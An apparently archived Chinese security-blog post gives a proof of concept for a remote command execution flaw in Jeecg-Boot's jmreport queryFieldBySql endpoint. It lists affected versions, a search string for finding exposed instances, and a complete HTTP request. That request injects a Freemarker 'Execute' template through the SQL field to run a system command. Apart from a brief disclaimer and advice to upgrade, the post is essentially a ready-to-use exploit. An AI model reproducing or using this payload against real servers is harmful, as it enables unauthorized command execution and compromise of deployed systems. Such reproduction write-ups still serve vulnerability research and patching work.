---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  Jeecg-Boot 远程命令执行漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-02-05 02:57  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
#   
  
01  
  
—  
  
漏洞名称  
  
# Jeecg-Boot 远程命令执行漏洞  
  
  
02  
  
—  
  
影响版本  
  
Jeecg-Boot版本3.0.0至3.5.3或者Jeecg-Boot版本2.4.x至2.4.6  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhKx3SXvWkwxfmsia0nRsyQ3u7tXAgE9T6Ass23YqH3VOIbYg0cuibI1niathvVa4KrVVALzHuo2oPzOw/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
Jeecg-Boot是一款企业级低代码开发平台，集成了AI应用功能，旨在帮助开发者快速实现低代码开发和构建个性化AI应用。该平台采用前后端分离架构，基于SpringBoot、SpringCloud、Vue3等主流技术栈，具备强大的代码生成器，可一键生成前后端代码，显著减少重复性工作，提高开发效率。Jeecg-Boot远  
程命令执行漏洞源于接口对用户输入的SQL语句未进行严格过滤和验证，攻击者可通  
过构造恶意SQL语  
句，利用Freemarker模板引擎的特性，将恶意代码注入到模板中执行  
，从而实现远程命令执行。  
  
04  
  
—  
  
资产测绘  
```
"Jeecg-Boot 企业级快速开发平台"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhKx3SXvWkwxfmsia0nRsyQ3utbxzIs6Rx2Fn8akWkAicNZsa6VoBOFPqrHh0apuyyBNusnCfk8eLxRg/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
  
```
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: 127.0.0.1
Connection: close
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=gNyJ0QkLIu1GswcpojLsUJVJD2h-kC_u20kPE6FC
Content-Type: application/json
Content-Length: 94

{"sql":"select '<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }' "}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhKx3SXvWkwxfmsia0nRsyQ3uia1zzb12CwAnqSs27BfNEyPS2ZxXhlzbqmsHrFdteiaXSiaZ2SyoniaFlg/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
升级到最新版本  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
